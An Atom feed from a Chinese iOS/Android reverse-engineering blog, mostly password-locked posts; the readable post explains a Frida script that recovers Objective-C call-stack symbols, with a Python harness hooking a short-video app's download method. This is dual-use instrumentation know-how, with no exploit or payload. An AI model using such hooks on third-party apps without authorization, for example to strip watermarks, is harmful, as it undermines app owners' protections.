<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-27T07:02:41.266Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-27T07:02:41.266Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>微信集赞插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-23T08:09:20.819Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
